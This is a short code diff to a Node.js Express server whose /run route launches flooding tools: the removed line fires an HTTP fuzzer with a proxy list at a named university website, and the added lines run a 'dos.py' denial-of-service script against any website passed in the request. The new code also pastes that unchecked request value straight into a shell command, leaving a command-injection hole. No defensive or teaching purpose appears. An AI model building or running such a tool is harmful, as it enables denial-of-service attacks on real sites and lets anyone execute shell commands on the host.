@@ -2,9 +2,10 @@ const express = require('express');
 const { exec } = require('child_process');
 const app = express();
 
-app.get('/run', (req, res) => {
+app.get('/run?:website', (req, res) => {
+  const website = req.params.website;
   exec(
-    'node httpfuzz.js https://www.iitb.ac.in/ proxy.txt 10000 POST',
+    `python3 dos.py ${website}`,
     (error, stdout, stderr) => {
       if (error) {
         res.status(500).send(error);
